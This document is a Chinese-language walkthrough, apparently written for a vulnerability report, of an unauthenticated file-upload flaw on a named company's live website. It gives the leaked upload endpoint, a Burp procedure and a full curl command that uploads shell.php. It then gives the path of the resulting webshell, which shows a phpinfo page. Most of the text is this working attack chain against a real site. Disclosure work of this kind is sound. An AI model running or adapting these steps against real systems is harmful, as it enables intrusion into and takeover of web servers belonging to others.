第1步：打开官网，截厂商证明（图1）
--------------------------------------------------------------------------------

1. 浏览器打开：https://www.biobasebaby.com/
2. 拉到页面最底下
3. 能看到「山东博科保育科技股份有限公司」和备案号
4. 截个图，保存成 01_厂商证明.png

这一张是给审核看这是不是博科自己的站。


--------------------------------------------------------------------------------
第2步：找到上传接口在哪泄露的（图2）
--------------------------------------------------------------------------------

1. 打开留言表单页：
   https://www.biobasebaby.com/index.php/formguide/index/index.html?id=5

2. 在页面上右键 → 查看网页源代码（或者 F12 切到 Elements/Sources）

3. Ctrl+F 搜索：image_upload_url

4. 能看到类似这样一行：
   image_upload_url': '/index.php/attachment/upload/upload/dir/images/module/formguide.html'

5. 截图要同时带上：
   - 浏览器地址栏（formguide那个url）
   - 源代码里 image_upload_url 那一行

6. 保存成 02_接口泄露.png


--------------------------------------------------------------------------------
第3步：上传 php 文件（图3）
--------------------------------------------------------------------------------

--- 方法A：用 Burp（推荐，截图好看） ---

1. 打开 Burp，Proxy 开好，或者直接开 Repeater
2. 打开本目录「上传请求包.txt」，整段复制到 Repeater 的 Request 里
3. 确认 Request 里没有 Cookie 头（有的话删掉，证明不用登录）
4. 点 Send
5. 看 Response，应该返回 json，里面有：
   "code":0
   "success":1
   "url":"/uploads/images/20260711/xxxxxxxx.php"
6. 截 Request + Response 一起，保存 03_上传成功.png

--- 方法B：用命令行 ---

在本目录打开终端（shell.php 和你在一个文件夹）：

  curl -sk -X POST "https://www.biobasebaby.com/index.php/attachment/upload/upload/dir/images/module/formguide.html" -F "file=@shell.php"

终端会打出 json，截这张图也行。

参考返回样例看「上传返回.json」，你每次上传文件名 hash 可能一样也可能变。


--------------------------------------------------------------------------------
第4步：浏览器访问 webshell，看 phpinfo（图4）
--------------------------------------------------------------------------------

1. 看第3步返回的 url 字段，比如：
   /uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php

2. 浏览器打开（前面加上域名）：
   https://www.biobasebaby.com/uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php

   具体地址也写在「验证地址.txt」里了

3. 页面出来一整张 phpinfo 表，标题写着 PHP Version 7.4.33

4. 截整个浏览器窗口，保存 04_phpinfo.png

到这一步漏洞就复现完了。
